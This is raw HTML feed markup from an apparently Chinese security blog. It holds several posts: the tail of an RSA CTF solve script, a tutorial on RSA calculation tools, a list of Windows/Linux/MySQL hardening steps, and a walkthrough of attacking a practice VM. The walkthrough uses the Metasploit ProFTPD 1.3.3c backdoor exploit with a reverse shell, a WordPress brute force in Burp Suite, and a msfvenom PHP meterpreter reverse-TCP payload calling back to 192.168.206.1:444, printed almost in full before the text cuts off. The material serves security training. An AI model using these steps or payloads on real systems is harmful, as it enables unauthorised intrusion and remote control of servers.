number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span>c <span class="token operator">=</span> <span class="token number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qfn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token comment">#求d</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment">#求m</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> Python </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA-Tool和Big Integer的用法破解RSA</title>
      <link href="/2022/03ead7dc3b.html"/>
      <url>/2022/03ead7dc3b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这玩意，能把我弄疯，之前没有怎么搞懂RSA原理，现在基本上搞懂了RSA的原理，工具基本上也会使用了，在此记录，我的密码学文章👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html#toc-heading-15">RSA密码学</a>。</p><hr><h2 id="一-RSA-TOOL的使用"><a href="#一-RSA-TOOL的使用" class="headerlink" title="一.RSA-TOOL的使用"></a>一.RSA-TOOL的使用</h2><p>打开软件页面如下👇</p><p><img src="/images/wordimage/2022/033/RSATOOL.png"></p><p>每个框框的解释如下图，看了应该就会使用了。</p><p><img src="/images/wordimage/2022/033/RSAtool2.png"></p><hr><h2 id="二-Big-Integer-Calculator的使用"><a href="#二-Big-Integer-Calculator的使用" class="headerlink" title="二.Big Integer Calculator的使用"></a>二.Big Integer Calculator的使用</h2><p>这个软件是用来求大数字的，我曾经还想着，使用Python可以解决一切，直到一个数字特别大，PYthon算不出来。。。，打开软件和使用方法如下。</p><p><img src="/images/wordimage/2022/033/BIG.png"></p><hr><h2 id="三-实战"><a href="#三-实战" class="headerlink" title="三.实战"></a>三.实战</h2><p>比如这里计算RSA，下面是题，需求是求M，求M的公式是<code>(c^d)modn=m</code>。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">p=447685307q=2037e=17c = 704796792<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，求出D，D为<code>53616899001</code>，N的求法是<code>p*q</code>，求出N为<code>911934970359</code></p><p><img src="/images/wordimage/2022/033/D.png"></p><p>可以开始求M了，这里需要使用<code>Big Integer Calculator</code>，来计算，如下图按照对应输入数字，即可计算成功M。</p><p><img src="/images/wordimage/2022/033/M.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Windows系统加固 Linux系统加固和数据库加固</title>
      <link href="/2022/03d4aef6da.html"/>
      <url>/2022/03d4aef6da.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>常用基础的windows和linux还有数据库的加固(其实是自己比赛的题)，这里使用的是<code>Windows server 2019</code></p><hr><h2 id="一-Windows加固"><a href="#一-Windows加固" class="headerlink" title="一.Windows加固"></a>一.Windows加固</h2><h3 id="1-设置密码策略"><a href="#1-设置密码策略" class="headerlink" title="1.设置密码策略"></a>1.设置密码策略</h3><blockquote><p>服务器管理 &gt; 工具 &gt; 本地安全策略 &gt; 账户策略 </p></blockquote><p><img src="/images/wordimage/2022/031/sea.png"></p><hr><h3 id="2-设置登录提示信息"><a href="#2-设置登录提示信息" class="headerlink" title="2.设置登录提示信息"></a>2.设置登录提示信息</h3><blockquote><p>服务器管理  &gt; 工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 安全选项</p></blockquote><p><img src="/images/wordimage/2022/031/auth.png"></p><hr><h3 id="3-设置登录失败账户锁定"><a href="#3-设置登录失败账户锁定" class="headerlink" title="3.设置登录失败账户锁定"></a>3.设置登录失败账户锁定</h3><blockquote><p>服务器管理 &gt; 工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 账户锁定策略</p></blockquote><p><img src="/images/wordimage/2022/031/suoding.png"></p><hr><h3 id="4-设置远程桌面空闲时间"><a href="#4-设置远程桌面空闲时间" class="headerlink" title="4.设置远程桌面空闲时间"></a>4.设置远程桌面空闲时间</h3><blockquote><p>win+r输入gpedit.msc &gt; 计算机配置 &gt; 管理模板 &gt; windows组件 &gt; 远程桌面服务 &gt; 远程桌面会话主机 &gt; 会话时间限制 &gt; 设置活动但空闲的远程桌面服务会话的时间限制.</p></blockquote><p><img src="/images/wordimage/2022/031/RDP.png"></p><hr><h3 id="5-通过SSL加密远程桌面服务"><a href="#5-通过SSL加密远程桌面服务" class="headerlink" title="5.通过SSL加密远程桌面服务"></a>5.通过SSL加密远程桌面服务</h3><blockquote><p>win+r输入gpedit.msc &gt; 计算机配置 &gt; 管理模板 &gt; windows组件 &gt; 远程桌面服务 &gt; 远程桌面会话主机 &gt; 安全 &gt; 远程(RDP)连接要求使用指定的安全层</p></blockquote><p><img src="/images/wordimage/2022/031/RDPAA.png"></p><hr><h3 id="6-仅允许超级管理员账号关闭系统"><a href="#6-仅允许超级管理员账号关闭系统" class="headerlink" title="6.仅允许超级管理员账号关闭系统"></a>6.仅允许超级管理员账号关闭系统</h3><blockquote><p>服务器管理 &gt; 工具 &gt; 本地安全策略  &gt; 本地策略 &gt; 用户权限分配 &gt; 关闭系统</p></blockquote><p><img src="/images/wordimage/2022/031/system.png"></p><hr><h3 id="7-开启IIS的日志审计记录"><a href="#7-开启IIS的日志审计记录" class="headerlink" title="7.开启IIS的日志审计记录"></a>7.开启IIS的日志审计记录</h3><p>需要提前安装好IIS服务。</p><blockquote><p>服务器管理 &gt; 工具 &gt; IIS管理 &gt; 日志</p></blockquote><p><img src="/images/wordimage/2022/031/W3C.png"></p><h3 id="8-设置网站的最大并发连接数"><a href="#8-设置网站的最大并发连接数" class="headerlink" title="8.设置网站的最大并发连接数"></a>8.设置网站的最大并发连接数</h3><blockquote><p>服务器管理 &gt; 工具 &gt; IIS管理 &gt; 网站 &gt; 右边高级设置</p></blockquote><p><img src="/images/wordimage/2022/031/IIS.png"></p><hr><h3 id="9-禁用IIS内核缓存"><a href="#9-禁用IIS内核缓存" class="headerlink" title="9.禁用IIS内核缓存"></a>9.禁用IIS内核缓存</h3><blockquote><p>服务器管理 &gt; 工具 &gt; IIS管理 &gt; 网站 &gt; 输出缓存 &gt; 右边编辑功能设置</p></blockquote><p><img src="/images/wordimage/2022/031/IISneihe.png"></p><hr><h3 id="10设置user1用户只能在周一至周五的9-00-18-00可以登录"><a href="#10设置user1用户只能在周一至周五的9-00-18-00可以登录" class="headerlink" title="10设置user1用户只能在周一至周五的9:00~18:00可以登录"></a>10设置user1用户只能在周一至周五的9:00~18:00可以登录</h3><p>输入如下命令设置👇，创建user1用户并且密码是123456789.com</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user user1 <span class="token number">123456789</span>.com /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入如下命令设置只能在周一到周五的9:00-18:00可以登录，这里的M代表英文周一，F代表周五，中间逗号隔开。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user user1 /times:M-F,9:00-18:00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/031/time.png"></p><hr><h2 id="二-Linux加固"><a href="#二-Linux加固" class="headerlink" title="二.Linux加固"></a>二.Linux加固</h2><h3 id="1-设置密码策略-1"><a href="#1-设置密码策略-1" class="headerlink" title="1.设置密码策略"></a>1.设置密码策略</h3><p>打开<code>/etc/login.defs</code>配置文件然后找到如下位置操作。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PASS_MAX_DAYS   99999#用户密码不过期的最大天数PASS_MIN_DAYS   0    #密码修改之间的最小PASS_MIN_LEN    5#密码最小长度PASS_WARN_AGE   7#密码过期前多少天开始提示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-设置登录信息"><a href="#2-设置登录信息" class="headerlink" title="2.设置登录信息"></a>2.设置登录信息</h3><p>打开<code>/etc/issue</code>配置即可。</p><hr><h3 id="3-设置计划任务"><a href="#3-设置计划任务" class="headerlink" title="3.设置计划任务"></a>3.设置计划任务</h3><p>设置root用户的计划任务。每天早上7:50自动开启vsftpd服务，22点50时关闭；每周六的7:30时，重新启动vsftpd服务</p><p>Crontab -e就可以了编辑，然后输入如下内容👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">50</span> <span class="token number">7</span> * * * <span class="token function">service</span> vsftpd start<span class="token number">50</span> <span class="token number">22</span> * * * <span class="token function">service</span> vsftpd stop<span class="token number">30</span> <span class="token number">7</span> * * * <span class="token function">service</span> vsftpd restrt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="4-禁止匿名用户登录vsftpd服务"><a href="#4-禁止匿名用户登录vsftpd服务" class="headerlink" title="4.禁止匿名用户登录vsftpd服务"></a>4.禁止匿名用户登录vsftpd服务</h3><p>打开<code>/etc/vsftpd/vsftpd.conf</code>，找到<code>Anonymous_enable</code>修改为no即可。</p><hr><h3 id="5-限制客户端连接vsftpd服务"><a href="#5-限制客户端连接vsftpd服务" class="headerlink" title="5.限制客户端连接vsftpd服务"></a>5.限制客户端连接vsftpd服务</h3><p>限制客户端连接vsftpd服务时，同一个IP最多只能打开两个连接。</p><p>打开<code>/etc/vsftpd/vsftpd.conf</code>，打开之后在最下面添加<code>max_per_ip=2</code>即可。</p><hr><h3 id="6-将SSH服务的端口号修改为2222"><a href="#6-将SSH服务的端口号修改为2222" class="headerlink" title="6.将SSH服务的端口号修改为2222"></a>6.将SSH服务的端口号修改为2222</h3><p>打开<code>/etc/ssh/sshd_config</code>找到<code>port</code>去掉“#”然后修改为222，然后重启服务<code>systemctl restart sshd</code>，如果失败就输入<code>semanage port -a -t ssh_port_t -p tcp 2222</code>，把selinux重新配置，重启即可，如果还是不行，就添加进入防火墙<code>firewall-cmd --permanent --add-port=2222/tcp</code>。</p><hr><h3 id="7-禁止root用户通过SSH远程登录"><a href="#7-禁止root用户通过SSH远程登录" class="headerlink" title="7.禁止root用户通过SSH远程登录"></a>7.禁止root用户通过SSH远程登录</h3><p>打开<code>etc/ssh/sshd_config</code>，找到PermitRootLogin YES修改为NO即可。</p><hr><h2 id="三-数据库加固"><a href="#三-数据库加固" class="headerlink" title="三.数据库加固"></a>三.数据库加固</h2><h3 id="1-查看数据库版本"><a href="#1-查看数据库版本" class="headerlink" title="1.查看数据库版本"></a>1.查看数据库版本</h3><p>使用命令<code>select version()</code></p><hr><h3 id="2-查看数据库列表"><a href="#2-查看数据库列表" class="headerlink" title="2.查看数据库列表"></a>2.查看数据库列表</h3><p>使用命令<code>show databases()</code></p><hr><h3 id="3-找到可以从任意-IP-地址访问的用户"><a href="#3-找到可以从任意-IP-地址访问的用户" class="headerlink" title="3.找到可以从任意 IP 地址访问的用户"></a>3.找到可以从任意 IP 地址访问的用户</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use mysql;select user,host from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="4-删除可以从任意IP地址访问的用户"><a href="#4-删除可以从任意IP地址访问的用户" class="headerlink" title="4.删除可以从任意IP地址访问的用户"></a>4.删除可以从任意IP地址访问的用户</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统加固 </tag>
            
            <tag> Windows系统 </tag>
            
            <tag> Linux系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解+漏洞利用靶机实战</title>
      <link href="/2022/0231ce5237.html"/>
      <url>/2022/0231ce5237.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此靶场可以练习暴力破解和简单的漏洞利用</p><p>靶场下载地址。</p><p>链接：<a href="https://pan.baidu.com/s/1mpB-pQ8i_FyG5fEI3H6U5w">https://pan.baidu.com/s/1mpB-pQ8i_FyG5fEI3H6U5w</a><br>提取码：j318</p><p>假设攻击击KALI的地址是:<code>192.168.206.1</code></p><p>靶机IP地址是:<code>192.168.205.78</code></p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><p>首先做网络发现，使用如下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.206.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图👇发现了靶机IP地址。</p><p><img src="/images/wordimage/2022/228/IPfaxian.png"></p><p>然后做更详细的信息收集，这里使用的是<code>nmap</code>命令，如下命令，nmap的详细用法👉<a href="https://blog.takagisan.top/2022/025219fdb7.html">nmap的基本用法</a>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.205.78<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫描结果👇，发现开放了<code>21 22 80 </code>端口，和对应的各个服务，<code>22</code>端口指的是可能远程SSH连接，<code>21</code>端口是FTP文件传输服务，<code>80</code>端口是Web服务。</p><p><img src="/images/wordimage/2022/228/portscan.png"></p><p>直接访问IP地址，发现是一个网页，如下图👇。</p><p><img src="/images/wordimage/2022/228/web.png"></p><hr><h2 id="二-ProFTPD漏洞利用"><a href="#二-ProFTPD漏洞利用" class="headerlink" title="二.ProFTPD漏洞利用"></a>二.ProFTPD漏洞利用</h2><p>因为有详细的版本号，这里直接在Kali打开<code>Metasploit</code>，命令是如下启动👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动效果如下图。</p><p><img src="/images/wordimage/2022/228/msf.png"></p><p>由于我们要寻找的是ProFTPD的漏洞，那么就需要进行搜索使用命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search ProFTPD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图效果👇。</p><p><img src="/images/wordimage/2022/228/ftpd.png"></p><p>因为这里的ProFTPD版本是1.3.3c这里碰巧就有这个版本，所以我们就使用这个版本即可也就是第五个模块，使用命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/unix/ftp/proftpd_133c_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入完毕之后就可以，设置payload了，查看可以使用多少个payload，使用命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图所示👇，这里使用的是第三个payloads。</p><p><img src="/images/wordimage/2022/228/shell.png"></p><p>设置payloads命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> payload cmd/unix/reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后查看需要做什么配置，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图👇，发现需要做配置的有<code>LHOST</code>和<code>RHOSTS</code>，如下图。</p><p><img src="/images/wordimage/2022/228/LHOSTandRHOST.png"></p><p>配置好靶机IP地址和KALI的IP地址即可如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.205.78<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.206.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入如下命令即可开始攻击。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图效果👇，红色箭头代表的是输入的命令，这里需要切换BASH。</p><p><img src="/images/wordimage/2022/228/success.png"></p><p>切换BASH命令如下👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换到bash之后，发现是root用户，如下图👇，漏洞利用完毕。</p><p><img src="/images/wordimage/2022/228/loudongliyong.png" alt="切换BASH"></p><hr><h2 id="三-暴力破解"><a href="#三-暴力破解" class="headerlink" title="三.暴力破解"></a>三.暴力破解</h2><p>这里使用另外一种方法来获取权限，但是比上面漏洞利用麻烦一点，通过信息收集可以知道，有80端口是开放了，是web服务，打开了，其实没有发现什么，使用KALI的<code>dirb</code>工具进行目录扫描，命令如下👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.205.78<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图所示👇，能发现，内部地址是<code>wordpress</code>博客。</p><p><img src="/images/wordimage/2022/228/WPADMIN.png"></p><p>访问这个地址如下👇，这里的思路是使用<code>wpscan</code>来扫描worpress，枚举一下用户。</p><p><img src="/images/wordimage/2022/228/word.png"></p><p>输入如下👇命令来枚举wordpress用户。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.205.78/secret --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图👇，发现找到一个<code>admin</code>用户，这里可以尝试使用暴力破解来猜测密码。</p><p><img src="/images/wordimage/2022/228/admin.png"></p><p>因为已经提前知道了是wordpress框架，所有就可以在网址后面加入<code>wp-admin</code>来进入后台登录,<code>http://192.168.205.78/secret/wp-admin</code>，如下图。</p><p><img src="/images/wordimage/2022/228/pojie.png"></p><p>如果在访问的时候发现重定向到了<code>vtcsec</code>，可以输入如下命令👇，然后按照图片操作即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/228/hosts.png"></p><p>这里暴力破解选择用<code>Burpsuit来暴力破解</code>，首先抓登录包，如下图👇。</p><p><img src="/images/wordimage/2022/228/burp.png"></p><p>然后选择右键选择<code>Intruder</code>，如下图👇。</p><p><img src="/images/wordimage/2022/228/attrck.png"></p><p>然后按照如下图顺序点击选择👇点击。</p><p><img src="/images/wordimage/2022/228/Inter.png"></p><p>之后在按照下图顺序点击选择👇。</p><p><img src="/images/wordimage/2022/228/burpa.png"></p><p>然后在按照如下图设置👇,其中第三步，是加载字典，这里需要加载弱密码字典，然后右上角直接开始攻击即可</p><p><img src="/images/wordimage/2022/228/jiazai.png"></p><p>成功发现弱密码，是<code>admin</code>，如下图。</p><p><img src="/images/wordimage/2022/228/bursucc.png"></p><h3 id="1-生成木马"><a href="#1-生成木马" class="headerlink" title="1.生成木马"></a>1.生成木马</h3><p>这里必须要生成PHP木马，方便后面做反弹，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.206.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">444</span> -f raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图效果下👇。</p><p><img src="/images/wordimage/2022/228/msfvenom.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/**/</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.206.1'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tcp://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$port</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> <span class="token constant">SOCK_STREAM</span><span class="token punctuation">,</span> <span class="token constant">SOL_TCP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">socket_connect</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nlen"</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin.executor.disable_eval'</span><span class="token punctuation">)</span><span class="token 